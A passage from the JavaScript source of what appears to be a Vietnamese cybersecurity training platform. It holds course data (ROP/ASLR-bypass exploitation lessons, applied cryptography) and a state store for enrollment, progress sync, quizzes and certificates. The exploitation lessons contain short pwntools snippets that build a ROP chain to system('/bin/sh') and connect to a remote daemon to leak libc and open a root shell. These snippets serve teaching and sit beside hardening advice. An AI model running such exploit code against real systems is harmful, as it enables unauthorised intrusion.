        "cve": "Bypass Mitigations: DEP/NX and ASLR Exploitation",
        "theory": "Khi cờ NX (No-Execute) được bật, vùng stack không thể chứa mã thực thi. Kỹ thuật ROP tận dụng các đoạn mã ngắn có sẵn trong file binary hoặc thư viện libc kết thúc bằng lệnh 'ret' (gọi là Gadgets). Bằng cách sắp xếp các địa chỉ gadget trên stack, kẻ tấn công điều khiển các thanh ghi và gọi hàm system() của thư viện C mà không cần chèn shellcode mới.",
        "codeSnippet": "# Xây dựng chuỗi ROP bằng ROPgadget và pwntools:\n# Gadget 1: pop rdi ; ret  (Để nạp chuỗi \"/bin/sh\" vào tham số 1)\nPOP_RDI = 0x000000000040120b\nBIN_SH  = 0x0000000000404050\nSYSTEM  = 0x0000000000401030\n\nrop_chain = b\"A\" * 72\nrop_chain += p64(POP_RDI)\nrop_chain += p64(BIN_SH)\nrop_chain += p64(SYSTEM)",
        "codeLanguage": "python",
        "payloadExample": "ROPgadget --binary ./vuln_elf --ropchain",
        "secureSnippet": "// Khuyến nghị biên dịch với bảo vệ tối đa:\n// gcc -fPIE -pie -Wl,-z,relro,-z,now -fstack-protector-strong -o hardened_binary main.c",
        "quiz": {
          "question": "Lệnh hợp ngữ nào bắt buộc phải kết thúc ở cuối mỗi đoạn Gadget trong một chuỗi ROP Chain kinh điển?",
          "options": [
            "ret (Return)",
            "call",
            "jmp",
            "nop"
          ],
          "correct": 0,
          "explanation": "Mỗi ROP Gadget phải kết thúc bằng lệnh 'ret' để lấy địa chỉ của gadget tiếp theo từ đỉnh stack và tiếp tục chuỗi điều khiển."
        }
      },
      {
        "id": "s6",
        "title": "Thao Trường Binary Capstone: Khai Thác Dịch Vụ Mạng Network Daemon Chiếm Quyền Root",
        "duration": "4h 45m",
        "objective": "Dịch ngược một dịch vụ TCP daemon từ xa, bypass ASLR qua lỗi rò rỉ địa chỉ bộ nhớ (Info Leak) và mở interactive root shell.",
        "mitre": "T1203 & T1059 - Khai thác dịch vụ daemon từ xa",
        "cve": "Remote Network Daemon Exploitation Challenge",
        "theory": "Trong thử thách đỉnh cao này, học viên kết hợp toàn bộ kỹ năng: dịch ngược nhị phân từ xa, tìm lỗi Format String hoặc Off-by-one để rò rỉ địa chỉ Libc cơ sở (Libc Base Address Leak), tính toán offset của hàm system(), xây dựng ROP chain vượt qua ASLR và giành quyền kiểm soát máy chủ từ xa.",
        "codeSnippet": "from pwn import *\n# Kết nối dịch vụ từ xa\nconn = remote('10.10.14.89', 9001)\n# Bước 1: Trích xuất địa chỉ rò rỉ libc puts\nconn.recvuntil(b\"Enter Token:\")\nconn.sendline(b\"%15$p\")\nlibc_leak = int(conn.recvline().strip(), 16)\nlibc_base = libc_leak - 0x21bf7\n# Bước 2: Bắn ROP payload giành root shell\nconn.sendline(craft_rop(libc_base))\nconn.interactive()",
        "codeLanguage": "python",
        "payloadExample": "nc 10.10.14.89 9001",
        "secureSnippet": "# Phòng vệ toàn diện:\n# 1. Bật ASLR toàn hệ thống: echo 2 > /proc/sys/kernel/randomize_va_space\n# 2. Sử dụng Seccomp BPF lọc bỏ các syscall nguy hiểm",
        "quiz": {
          "question": "Cơ chế bảo vệ ASLR (Address Space Layout Randomization) thường bị kẻ tấn công vượt qua bằng phương pháp nào?",
          "options": [
            "Lợi dụng một lỗ hổng rò rỉ thông tin bộ nhớ (Information Leak) để tính toán địa chỉ gốc (Base Address)",
            "Chờ máy chủ khởi động lại",
            "Tăng kích thước gói tin gửi đi gấp đôi",
            "Sử dụng giao thức HTTPS thay vì HTTP"
          ],
          "correct": 0,
          "explanation": "ASLR ngẫu nhiên hóa vị trí nạp của thư viện, nhưng khoảng cách (offset) giữa các hàm trong cùng một thư viện luôn cố định. Khi rò rỉ được 1 địa chỉ, hacker tính được địa chỉ gốc và mọi hàm khác."
        }
      }
    ]
  },
  {
    "id": "mod-sec101",
    "code": "SEC-101",
    "category": "defensive",
    "track": "Kỹ Thuật Mật Mã / Phòng Thủ Mật Mã Ứng Dụng",
    "title": "Mật Mã Học Thực Hành, Giao Thức TLS/SSL & Hạ Tầng Khóa Công Khai PKI",
    "difficulty": "Cơ Bản",
    "difficultyKey": "novice",
    "duration": "12 Giờ Học",
    "lessonsCount": 4,
    "labsCount": 2,
    "enrolledCount": "4,680",
    "mitre": "T1573 / T1587.003",
    "cert": "Security+ / CISSP Domain 3",
    "cvssBase": "7.5 HIGH",
    "threatProfile": "Lỗ Hổng Thuật Toán Mã Hóa & Giả Mạo Chứng Chỉ Số",
    "description": "Nắm vững nguyên lý mật mã học đối xứng và bất đối xứng, thuật toán băm an toàn và chứng chỉ số X.509. Thực hành cấu hình an toàn cho AES-256-GCM, RSA, Elliptic Curves và giải mã bắt tay TLS 1.3.",
    "labLink": "/labs",
    "labId": "lab-06",
    "syllabus": [
      {
        "id": "s1",
        "title": "Mã Hóa Khóa Đối Xứng: Chế Độ Khối Block Ciphers & Chuẩn AES-GCM",
        "duration": "2h 30m",
        "objective": "So sánh chế độ ECB, CBC và GCM, hiểu vì sao ECB không an toàn và làm chủ mã hóa chứng thực Galois/Counter Mode.",
        "mitre": "T1573 - Mã hóa kênh truyền thông tin",
        "cve": "CWE-327: Sử Dụng Thuật Toán Mật Mã Bị Lỗi Thời (ECB Mode Penguin)",
        "theory": "AES là thuật toán mã hóa khối tiêu chuẩn toàn cầu. Tuy nhiên, chế độ hoạt động (Block Cipher Mode) quyết định độ an toàn thực tế. Chế độ ECB mã hóa các khối dữ liệu giống nhau thành bản mã giống hệt nhau, làm lộ hình dáng và cấu trúc của dữ liệu ban đầu. Chế độ AES-GCM vừa mã hóa vừa cung cấp tính toàn vẹn (Authenticated Encryption with Associated Data - AEAD).",
        "codeSnippet": "// Mã hóa an toàn với Node.js Crypto (AES-256-GCM):\nconst crypto = require('crypto');\n\nfunction encrypt(text, secretKey) {\n  const iv = crypto.randomBytes(12); // Chuẩn IV 12 bytes cho GCM\n  const cipher = crypto.createCipheriv('aes-256-gcm', secretKey, iv);\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  const authTag = cipher.getAuthTag().toString('hex');\n  return { iv: iv.toString('hex'), encrypted, authTag };\n}",
        "codeLanguage": "javascript",
        "payloadExample": "openssl enc -aes-256-gcm -in secret.txt -out secret.enc -k MyStrongPass",
        "secureSnippet": "// Luôn sử dụng AES-256-GCM hoặc ChaCha20-Poly1305\n// Tuyệt đối không bao giờ tái sử dụng cùng một cặp (Key, IV) trong chế độ GCM",
        "quiz": {
          "question": "Tại sao chế độ mã hóa AES-ECB (Electronic Codebook) TUYỆT ĐỐI KHÔNG ĐƯỢC PHÉP sử dụng cho dữ liệu lớn hơn 16 bytes?",
          "options": [
            "Các khối dữ liệu đầu vào giống nhau sẽ sinh ra các khối bản mã giống hệt nhau, làm lộ quy luật dữ liệu gốc",
            "ECB chạy quá chậm so với CBC",
            "ECB chỉ hỗ trợ mật khẩu 8 ký tự",
            "ECB yêu cầu kết nối Internet liên tục"
          ],
          "correct": 0,
          "explanation": "ECB mã hóa từng khối độc lập mà không dùng vector khởi tạo (IV). Do đó, các khối plain-text giống nhau tạo ra cipher-text giống hệt nhau (minh chứng qua hình ảnh chú chim cánh cụt ECB Penguin nổi tiếng)."
        }
      },
      {
        "id": "s2",
        "title": "Mật Mã Khóa Bất Đối Xứng: RSA, Trao Đổi Khóa Diffie-Hellman & Đường Cong Elliptic (ECC)",
        "duration": "3h 15m",
        "objective": "Hiểu cặp khóa Public/Private, số học modulo, trao đổi khóa ECDH và nguyên lý bảo mật tương lai Forward Secrecy.",
        "mitre": "T1573 - Mật mã bất đối xứng",
        "cve": "Cryptographic Key Exchange & Forward Secrecy",
        "theory": "Mật mã bất đối xứng sử dụng cặp khóa khác nhau: Khóa công khai (Public Key) dùng để mã hóa hoặc kiểm tra chữ ký, Khóa bí mật (Private Key) dùng để giải mã hoặc tạo chữ ký số. Đường cong Elliptic (ECC / Curve25519) cung cấp độ an toàn tương đương RSA 3072-bit nhưng với kích thước khóa chỉ 256-bit, tiết kiệm băng thông và tăng tốc xử lý.",
        "codeSnippet": "// Tạo cặp khóa Elliptic Curve X25519 an toàn trong OpenSSL:\nopenssl genpkey -algorithm ED25519 -out private_key.pem\nopenssl pkey -in private_key.pem -pubout -out public_key.pem",
        "codeLanguage": "bash",
        "payloadExample": "ssh-keygen -t ed25519 -C \"admin@cyber-range.vn\"",
        "secureSnippet": "// Khuyến nghị quản trị khóa:\n// 1. Chuyển đổi từ RSA 2048 sang Ed25519 hoặc RSA 4096-bit\n// 2. Kích hoạt Ephemeral Diffie-Hellman (ECDHE) để đảm bảo Perfect Forward Secrecy",
        "quiz": {
          "question": "Tính chất nào (Perfect Forward Secrecy - PFS) đảm bảo rằng các phiên giao tiếp đã ghi lại trong quá khứ không thể bị giải mã ngay cả khi khóa bí mật của server bị đánh cắp sau này?",
          "options": [
            "Tạo khóa phiên tạm thời (Ephemeral Session Keys) duy nhất cho mỗi phiên kết nối",
            "Sử dụng mật khẩu dài hơn 50 ký tự",
            "Mã hóa file bằng phần mềm WinRAR",
            "Đổi địa chỉ IP máy chủ hàng tuần"
          ],
          "correct": 0,
          "explanation": "Perfect Forward Secrecy (PFS) sử dụng các tham số Diffie-Hellman tạm thời (Ephemeral ECDHE) và hủy khóa phiên ngay sau khi kết thúc, khiến việc lộ khóa private dài hạn của server không thể giải mã các phiên cũ."
        }
      },
      {
        "id": "s3",
        "title": "Thuật Toán Băm Mật Mã & Cơ Chế Chữ Ký Khối HMAC Chống Giả Mạo",
        "duration": "2h 45m",
        "objective": "Phân biệt hàm băm nhanh (SHA-256) và hàm băm mật khẩu chậm có salt (Argon2, bcrypt), và ký số API bằng HMAC-SHA256.",
        "mitre": "T1003 - Tấn công bẻ khóa mật khẩu đã băm",
        "cve": "CWE-328: Sử Dụng Hàm Băm Yếu (MD5 / SHA1 Collisions)",
        "theory": "Hàm băm là hàm một chiều không thể đảo ngược. MD5 và SHA-1 đã bị phá vỡ hoàn toàn bởi các cuộc tấn công tìm xung đột (Collision Attack). Khi lưu trữ mật khẩu người dùng, TUYỆT ĐỐI KHÔNG dùng SHA-256 vì GPU có thể tính toán hàng tỷ hash mỗi giây. Bắt buộc phải sử dụng các thuật toán chậm có kiểm soát bộ nhớ như Argon2id hoặc bcrypt.",
        "codeSnippet": "// Xác thực chữ ký HMAC-SHA256 bảo vệ Webhook:\nconst crypto = require('crypto');\n\nfunction verifyWebhook(payload, signature, secret) {\n  const hmac = crypto.createHmac('sha256', secret);\n  const calculated = 'sha256=' + hmac.update(payload).digest('hex');\n  // So sánh chuỗi an toàn chống Timing Attack:\n  return crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(calculated));\n}",
        "codeLanguage": "javascript",
        "payloadExample": "echo -n \"user=admin&role=root\" | openssl dgst -sha256 -hmac \"SecretKey\"",
        "secureSnippet": "// Băm mật khẩu người dùng chuẩn Argon2id:\nconst argon2 = require('argon2');\nconst hash = await argon2.hash(password, {\n  type: argon2.argon2id,\n  memoryCost: 65536, // 64 MB RAM\n  timeCost: 3        // 3 iterations\n});",
        "quiz": {
          "question": "Thuật toán băm mật khẩu nào đã giành chiến thắng trong Cuộc thi Hashing Mật khẩu Quốc tế (PHC) và được khuyến nghị sử dụng hàng đầu hiện nay?",
          "options": [
            "Argon2 (đặc biệt là biến thể Argon2id)",
            "MD5",
            "SHA-256",
            "DES"
          ],
          "correct": 0,
          "explanation": "Argon2 là chuẩn mã hóa mật khẩu hiện đại nhất, kết hợp khả năng chống tấn công brute-force bằng GPU lẫn tấn công Trade-off bộ nhớ/thời gian."
        }
      },
      {
        "id": "s4",
        "title": "Hạ Tầng Khóa Công Khai PKI, Nhà Xác Thực CA & Giải Mã Bắt Tay TLS 1.3",
        "duration": "3h 30m",
        "objective": "Kiểm tra chuỗi chứng chỉ X.509, phát hiện chứng chỉ bị thu hồi/hết hạn và hiểu quy trình tối ưu hóa bắt tay 1-RTT của TLS 1.3.",
        "mitre": "T1587.003 - Chứng chỉ số giả mạo",
        "cve": "TLS Protocol Downgrade Attacks & Certificate Validation",
        "theory": "Hạ tầng khóa công khai (PKI) dựa trên các tổ chức chứng thực Certificate Authorities (CA) đáng tin cậy. TLS 1.3 loại bỏ hoàn toàn các thuật toán mật mã cũ không an toàn (RC4, 3DES, MD5, SHA-1) và cắt giảm quá trình bắt tay mật mã xuống chỉ còn 1 vòng truyền nhận (1-RTT), tăng tốc độ kết nối và bảo mật tuyệt đối.",
        "codeSnippet": "# Kiểm tra thông tin chứng chỉ SSL/TLS của máy chủ qua OpenSSL:\nopenssl s_client -connect bank.com:443 -servername bank.com -tls1_3",
        "codeLanguage": "bash",
        "payloadExample": "openssl x509 -in cert.crt -text -noout",
        "secureSnippet": "# Cấu hình Nginx bật TLS 1.3 và vô hiệu hóa TLS 1.0 / 1.1:\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;\nssl_prefer_server_ciphers off;\nadd_header Strict-Transport-Security \"max-age=63072000; includeSubDomains; preload\" always;",
        "quiz": {
          "question": "Giao thức TLS 1.3 hiện đại yêu cầu bao nhiêu vòng truyền nhận (Round-Trip Time - RTT) để hoàn tất quá trình bắt tay thiết lập phiên mã hóa đầy đủ?",
          "options": [
            "1 RTT (và 0-RTT cho việc khôi phục phiên)",
            "3 RTT",
            "5 RTT",
            "Không cần RTT nào"
          ],
          "correct": 0,
          "explanation": "TLS 1.3 tối ưu hóa quá trình bắt tay từ 2 RTT (trong TLS 1.2) xuống còn 1 RTT duy nhất bằng cách gửi các tham số chia sẻ khóa Diffie-Hellman ngay trong gói tin ClientHello."
        }
      }
    ]
  }
]

/**
 * useLearningStore
 * Quản lý danh mục giáo trình, tiến độ bài học, điểm thưởng XP và tương tác Sandbox.
 */
export const useLearningStore = create((set, get) => {
  // Load saved state from localStorage if available (used as fast-render cache only)
  const savedEnrolled = JSON.parse(
    localStorage.getItem("cyber_enrolled_courses") || '["mod-web201"]'
  )
  const savedCompleted = JSON.parse(
    localStorage.getItem("cyber_completed_lessons") || '{}'
  )
  const savedCapstone = JSON.parse(
    localStorage.getItem("cyber_capstone_completed") || '{}'
  )
  const savedXp = parseInt(localStorage.getItem("cyber_user_learning_xp") || "0", 10)

  return {
    courses: INITIAL_COURSES,
    enrolledCourses: savedEnrolled,
    completedLessons: savedCompleted, // { [courseId]: string[] } (Backend is source of truth)
    capstoneCompleted: savedCapstone, // { [courseId]: boolean }
    capstoneSubmissions: {}, // { [courseId]: submissionData }
    quizSummaries: {}, // { [courseId]: summaryData }
    certificates: {}, // { [courseId]: certificateData }
    isClaimingCert: false,
    isSubmittingCapstone: false,
    userXp: savedXp,

    // Synchronization state with Backend API
    syncStatus: "idle", // "idle" | "syncing" | "synced" | "error"
    syncError: null,

    // Interactive Lesson Modal state
    activeLessonModal: null, // { course, lesson, lessonIndex }

    // Helper: Check if enrolled
    isEnrolled: (courseId) => {
      return get().enrolledCourses.includes(courseId)
    },

    // Helper: Get progress percentage for a course
    getCourseProgress: (courseId) => {
      const { courses, completedLessons } = get()
      const course = courses.find((c) => c.id === courseId)
      if (!course || !course.syllabus || course.syllabus.length === 0) return 0
      const completed = completedLessons[courseId] || []
      return Math.round((completed.length / course.syllabus.length) * 100)
    },

    // Check if lesson is unlocked based on prerequisite sequence
    isLessonUnlocked: (courseId, lessonIndex) => {
      if (lessonIndex <= 0) return true
      const { courses, completedLessons } = get()
      const course = courses.find((c) => c.id === courseId)
      if (!course || !course.syllabus) return false
      const prevLesson = course.syllabus[lessonIndex - 1]
      if (!prevLesson) return true
      const doneList = completedLessons[courseId] || []
      return doneList.includes(prevLesson.id)
    },

    // Submit Quiz Attempt to Backend
    submitQuizAttempt: async (lesson, selectedOption, correctOption) => {
      try {
        const lessonBackendId = lesson?.backendId
        if (lessonBackendId) {
          await certificationService.submitQuiz(lessonBackendId, selectedOption, correctOption)
        }
      } catch {
        // Fallback silently if offline or token expired
      }
    },

    // Fetch quiz summary for course from server
    fetchQuizSummary: async (courseId, backendCourseId) => {
      if (!backendCourseId) return null
      try {
        const summary = await certificationService.getCourseQuizSummary(backendCourseId)
        if (summary) {
          set((state) => ({
            quizSummaries: { ...state.quizSummaries, [courseId]: summary },
          }))
          return summary
        }
      } catch {
        // Ignore if error
      }
      return null
    },

    // Submit Capstone Project with NIST NICE Rubric evaluation
    submitCapstoneProject: async (courseId, backendCourseId, payload = {}) => {
      set({ isSubmittingCapstone: true })
      try {
        const submissionPayload = {
          reportContent: payload.reportContent || "Báo cáo thực hành Capstone: Đã hoàn tất diễn tập chuỗi tấn công và cấu hình phòng thủ theo chuẩn NIST.",
          solutionUrl: payload.solutionUrl || "https://github.com/cybersecurity-lab/capstone-defense",
          reconScore: payload.reconScore || 18,
          exploitScore: payload.exploitScore || 32,
          remediationScore: payload.remediationScore || 28,
          reportScore: payload.reportScore || 14,
        }

        const res = await certificationService.submitCapstone(backendCourseId, submissionPayload)
        const updated = { ...get().capstoneCompleted, [courseId]: true }
        localStorage.setItem("cyber_capstone_completed", JSON.stringify(updated))

        set((state) => ({
          capstoneCompleted: updated,
          capstoneSubmissions: { ...state.capstoneSubmissions, [courseId]: res },
          isSubmittingCapstone: false,
        }))

        useNotificationStore.getState().success(
          "Nghiệm Thu Đồ Án Capstone Thành Công!",
          `Điểm Rubric NIST NICE: ${res.totalScore}/100 (Trạng thái: ${res.status}).`
        )
        return res
      } catch (err) {
        set({ isSubmittingCapstone: false })
        const errMsg = err.response?.data?.message || err.message || "Lỗi khi nộp đồ án Capstone."
        useNotificationStore.getState().error("Nộp Capstone Thất Bại", errMsg)
        throw err
      }
    },

    // Claim official verifiable digital certificate from backend
    claimOfficialCertificate: async (courseId, backendCourseId) => {
      set({ isClaimingCert: true })
      try {
        const cert = await certificationService.claimCertificate(backendCourseId)
        set((state) => ({
          certificates: { ...state.certificates, [courseId]: cert },
          isClaimingCert: false,
        }))
        useNotificationStore.getState().success(
          "Cấp Chứng Chỉ Số Thành Công!",
          `Mã chứng chỉ: ${cert.certificateCode}. Chữ ký số PGP đã được ghi nhận vào sổ đăng ký.`
        )
        return cert
      } catch (err) {
        set({ isClaimingCert: false })
        const errMsg = err.response?.data?.message || err.message || "Không thể cấp chứng chỉ. Vui lòng kiểm tra lại điều kiện hoàn thành."
        useNotificationStore.getState().error("Cấp Chứng Chỉ Thất Bại", errMsg)
        throw err
      }
    },

    // Fetch existing certificate if already issued
    fetchCertificateForCourse: async (courseId, backendCourseId) => {
      if (!backendCourseId) return null
      try {
        const cert = await certificationService.getCertificateForCourse(backendCourseId)
        if (cert) {
          set((state) => ({
            certificates: { ...state.certificates, [courseId]: cert },
          }))
          return cert
        }
      } catch {
        // Ignore
      }
      return null
    },

    // Check if course meets all conditions to claim official PGP certificate:
    // 1. Backend progress 100% synced without error
    // 2. All lessons completed in database
    // 3. Quiz average >= 80% (if server quizSummary is available)
    // 4. Capstone project completed
    canClaimCertificate: (courseId) => {
      const { courses, completedLessons, capstoneCompleted, syncStatus, quizSummaries } = get()
      const course = courses.find((c) => c.id === courseId)
      if (!course || !course.syllabus || course.syllabus.length === 0) return false
      if (syncStatus === "error") return false

      const doneList = completedLessons[courseId] || []
      const allLessonsDone = course.syllabus.every((s) => doneList.includes(s.id))
      const capstoneDone = !!capstoneCompleted[courseId]

      // Check quiz criteria if fetched
      const summary = quizSummaries[courseId]
      const quizPassed = !summary || summary.meetsRequirement !== false

      return allLessonsDone && capstoneDone && quizPassed
    },

    // Retry synchronization for a course
    retrySync: async (courseId) => {
      const course = get().courses.find((c) => c.id === courseId)
      if (course?.backendId) {
        return await get().syncCourseProgress(course.id, course.backendId)
      }
      return await get().fetchCoursesFromApi()
    },

    // Sync progress from Backend API (Backend is the absolute source of truth)
    syncCourseProgress: async (courseId, backendCourseId) => {
      set({ syncStatus: "syncing", syncError: null })
      try {
        const res = await progressService.getCourseProgress(backendCourseId)
        if (res.success && res.data?.lessonProgressList) {
          const course = get().courses.find((c) => c.id === courseId)
          const doneLessonIds = []

          res.data.lessonProgressList.forEach((lp, lpIdx) => {
            if (lp.completed) {
              const matchedLesson = course?.syllabus?.find(
                (s, sIdx) =>
                  s.backendId === lp.lessonId ||
                  (s.backendSlug && s.backendSlug === lp.lessonSlug) ||
                  (s.slug && s.slug === lp.lessonSlug) ||
                  sIdx === lpIdx
              )
              if (matchedLesson) {
                doneLessonIds.push(matchedLesson.id)
              } else {
                doneLessonIds.push(`s${lpIdx + 1}`)
              }
            }
          })

          set((state) => {
            const newCompleted = { ...state.completedLessons, [courseId]: doneLessonIds }
            localStorage.setItem("cyber_completed_lessons", JSON.stringify(newCompleted))
            return { completedLessons: newCompleted, syncStatus: "synced", syncError: null }
          })
          return { success: true, count: doneLessonIds.length }
        } else {
          set({ syncStatus: "error", syncError: res.error || "Không thể đồng bộ tiến độ từ máy chủ" })
          return { success: false, error: res.error }
        }
      } catch (err) {
        set({ syncStatus: "error", syncError: err.message || "Lỗi mạng khi đồng bộ tiến độ" })
        return { success: false, error: err.message }
      }
    },

    // Fetch live courses from Backend API and map REAL backendId/slug into each lesson
    fetchCoursesFromApi: async () => {
      set({ syncStatus: "syncing", syncError: null })
      try {
        const res = await courseService.getCourses()
        if (res.success && Array.isArray(res.data) && res.data.length > 0) {
          const liveCourses = await Promise.all(
            res.data.map(async (c, idx) => {
              const matched = INITIAL_COURSES.find(
                (m) => m.id === c.slug || m.code?.toLowerCase() === c.slug?.toLowerCase()
              )
              const template = matched || INITIAL_COURSES[idx % INITIAL_COURSES.length]

              // Fetch REAL lessons from backend for this course
              let realLessons = []
              try {
                const lessonRes = await courseService.getLessonsByCourseId(c.id)
                if (lessonRes.success && Array.isArray(lessonRes.data) && lessonRes.data.length > 0) {
                  realLessons = lessonRes.data
                } else {
                  // Fallback: fetch via modules then lessons
                  const modRes = await courseService.getModulesByCourseId(c.id)
                  if (modRes.success && Array.isArray(modRes.data)) {
                    for (const mod of modRes.data) {
                      const modLessonsRes = await courseService.getLessonsByModuleId(mod.id)
                      if (modLessonsRes.success && Array.isArray(modLessonsRes.data)) {
                        realLessons.push(...modLessonsRes.data)
                      }
                    }
                  }
                }
              } catch (e) {
                console.warn(`Could not load real lessons for course ${c.id}:`, e)
              }

              // Map each syllabus item with REAL database IDs and slugs
              const mappedSyllabus = template.syllabus.map((s, sIdx) => {
                const matchedReal =
                  realLessons.find(
                    (rl) =>
                      (s.slug && rl.slug === s.slug) ||
                      (rl.position && rl.position === sIdx + 1)
                  ) || realLessons[sIdx]

                return {
                  ...s,
                  backendId: matchedReal ? matchedReal.id : null,
                  backendSlug: matchedReal?.slug || s.slug || null,
                  backendModuleId: matchedReal?.moduleId || null,
                  realTitle: matchedReal?.title || s.title,
                }
              })

              return {
                ...template,
                id: c.slug || `course-${c.id}`,
                backendId: c.id,
                code: template.code || (c.slug ? c.slug.toUpperCase().slice(0, 8) : `SEC-${c.id}`),
                title: c.title,
                description: c.description || template.description,
                difficulty: c.difficulty === "BEGINNER" ? "Cơ Bản" : c.difficulty === "HARD" ? "Nâng Cao" : "Trung Cấp",
                difficultyKey: c.difficulty?.toLowerCase() || "intermediate",
                syllabus: mappedSyllabus,
              }
            })
          )

          set({ courses: liveCourses, syncStatus: "synced", syncError: null })

          // Đồng bộ tiến độ cho các khóa học đã ghi danh
          const { enrolledCourses } = get()
          for (const enc of enrolledCourses) {
            const found = liveCourses.find((lc) => lc.id === enc)
            if (found?.backendId) {
              await get().syncCourseProgress(found.id, found.backendId)
            }
          }
        }
      } catch (err) {
        console.warn("Could not fetch courses from backend API", err)
        set({ syncStatus: "error", syncError: err.message || "Lỗi kết nối máy chủ" })
      }
    },

    // Fetch user enrollments from Backend API
    fetchUserEnrollments: async () => {
      try {
        const res = await progressService.getMyEnrollments()
        if (res.success && Array.isArray(res.data)) {
          const enrolledSlugs = res.data.map((e) => e.courseSlug || `course-${e.courseId}`)
          set({ enrolledCourses: enrolledSlugs })
          // Kéo tiến độ từng khóa
          for (const e of res.data) {
            await get().syncCourseProgress(e.courseSlug, e.courseId)
          }
        }
      } catch (err) {
        console.warn("Could not fetch enrollments from backend", err)
      }
    },

    // Enroll in course
    enrollCourse: async (courseId) => {
      const { enrolledCourses, courses } = get()
      if (enrolledCourses.includes(courseId)) return true

      const updated = [...enrolledCourses, courseId]
      localStorage.setItem("cyber_enrolled_courses", JSON.stringify(updated))
      set({ enrolledCourses: updated })

      const course = courses.find((c) => c.id === courseId)
      if (course?.backendId) {
        try {
          await progressService.enrollCourse(course.backendId)
          await get().syncCourseProgress(course.id, course.backendId)
        } catch {
          // Fallback smoothly
        }
      }

      useNotificationStore
        .getState()
        .success(
          "Kích hoạt khóa học thành công!",
          `Bạn đã ghi danh vào track: ${course?.title || courseId}`
        )
      return true
    },

    // Toggle completed status of a lesson with prerequisite enforcement and strict server sync
    toggleLesson: async (courseId, lessonId) => {
      const { completedLessons, userXp, courses, isLessonUnlocked } = get()
      const course = courses.find((c) => c.id === courseId)
      if (!course) return false

      const current = completedLessons[courseId] || []
      const isCurrentlyDone = current.includes(lessonId)
      const lessonIndex = course.syllabus?.findIndex((s) => s.id === lessonId) ?? -1
      const lesson = course.syllabus?.[lessonIndex]

      // Kiểm tra điều kiện prerequisite trước khi đánh dấu hoàn thành
      if (!isCurrentlyDone && lessonIndex > 0) {
        const unlocked = isLessonUnlocked(courseId, lessonIndex)
        if (!unlocked) {
          const prevLesson = course.syllabus[lessonIndex - 1]
          useNotificationStore.getState().warning(
            "Bài Học Đang Bị Khóa (Prerequisite Required)",
            `Bạn cần hoàn thành bài học trước: "${prevLesson?.title || 'Bài trước'}" để mở khóa bài học này.`
          )
          return false
        }
      }

      const targetBackendLessonId = lesson?.backendId
      if (!targetBackendLessonId) {
        useNotificationStore.getState().error(
          "Lỗi Ánh Xạ Bài Học",
          "Không tìm thấy ID bài học hợp lệ trên máy chủ. Vui lòng tải lại trang."
        )
        return false
      }

      set({ syncStatus: "syncing", syncError: null })

      // Đảm bảo học viên đã enroll khóa học ở backend trước khi ghi nhận bài
      if (course.backendId && !get().enrolledCourses.includes(courseId)) {
        try {
          await progressService.enrollCourse(course.backendId)
          set((state) => ({ enrolledCourses: [...state.enrolledCourses, courseId] }))
        } catch {
          // ignore if already enrolled
        }
      }

      try {
        if (!isCurrentlyDone) {
          // Gọi API hoàn thành bài học
          const res = await progressService.completeLesson(targetBackendLessonId)
          if (!res.success) {
            set({ syncStatus: "error", syncError: res.error || "Máy chủ từ chối ghi nhận hoàn thành bài học" })
            useNotificationStore.getState().error(
              "Đồng Bộ Tiến Độ Thất Bại",
              `${res.error || "Máy chủ từ chối ghi nhận hoàn thành bài học"}. Vui lòng thử lại.`
            )
            return false
          }

          const updatedList = [...current, lessonId]
          const newXp = userXp + 100
          const newCompleted = { ...completedLessons, [courseId]: updatedList }

          localStorage.setItem("cyber_completed_lessons", JSON.stringify(newCompleted))
          localStorage.setItem("cyber_user_learning_xp", newXp.toString())

          set({
            completedLessons: newCompleted,
            userXp: newXp,
            syncStatus: "synced",
            syncError: null,
          })

          useNotificationStore.getState().success(
            "Hoàn Thành Bài Học!",
            `+100 XP. Tiến độ bài học "${lesson.title}" đã được lưu trên máy chủ.`
          )
          return true
        } else {
          // Gọi API đặt lại bài học
          const res = await progressService.resetLesson(targetBackendLessonId)
          if (!res.success) {
            set({ syncStatus: "error", syncError: res.error || "Không thể đặt lại tiến độ trên máy chủ" })
            useNotificationStore.getState().error(
              "Đặt Lại Thất Bại",
              `${res.error || "Không thể đặt lại tiến độ trên máy chủ"}.`
            )
            return false
          }

          const updatedList = current.filter((id) => id !== lessonId)
          const newXp = Math.max(0, userXp - 100)
          const newCompleted = { ...completedLessons, [courseId]: updatedList }

          localStorage.setItem("cyber_completed_lessons", JSON.stringify(newCompleted))
          localStorage.setItem("cyber_user_learning_xp", newXp.toString())

          set({
            completedLessons: newCompleted,
            userXp: newXp,
            syncStatus: "synced",
            syncError: null,
          })

          useNotificationStore.getState().info(
            "Đã Đặt Lại Bài Học",
            `Tiến độ bài học "${lesson.title}" đã được đặt lại.`
          )
          return true
        }
      } catch (err) {
        set({ syncStatus: "error", syncError: err.message || "Lỗi mạng" })
        useNotificationStore.getState().error(
          "Lỗi Kết Nối Mạng",
          "Không thể gửi yêu cầu đến máy chủ. Tiến độ không được lưu."
        )
        return false
      }
    },

    // Open Interactive Lesson Modal
    openLessonModal: (courseId, lessonId) => {
      const { courses, enrolledCourses, enrollCourse, isLessonUnlocked, completedLessons } = get()
      const course = courses.find((c) => c.id === courseId)
      if (!course) return

      // Auto-enroll if not enrolled
      if (!enrolledCourses.includes(courseId)) {
        enrollCourse(courseId)
      }

      // If no specific lesson requested, find first uncompleted or first lesson
      const completed = completedLessons[courseId] || []
      let targetLesson = null
      let targetIndex = 0

      if (lessonId) {
        targetIndex = course.syllabus.findIndex((s) => s.id === lessonId)
        targetLesson = course.syllabus[targetIndex]
      }

      if (!targetLesson) {
        // find first incomplete
        targetIndex = course.syllabus.findIndex((s) => !completed.includes(s.id))
        if (targetIndex === -1) targetIndex = 0
        targetLesson = course.syllabus[targetIndex]
      }

      // Kiểm tra khóa prerequisite
      if (targetIndex > 0 && !isLessonUnlocked(courseId, targetIndex)) {
        const prevLesson = course.syllabus[targetIndex - 1]
        useNotificationStore.getState().warning(
          "Bài Học Đang Bị Khóa (Prerequisite Required)",
          `Vui lòng hoàn thành bài học tiên quyết: "${prevLesson?.title || 'Bài trước'}" để mở khóa bài học này.`
        )
        return
      }

      set({
        activeLessonModal: {
          course,
          lesson: targetLesson,
          lessonIndex: targetIndex,
        },
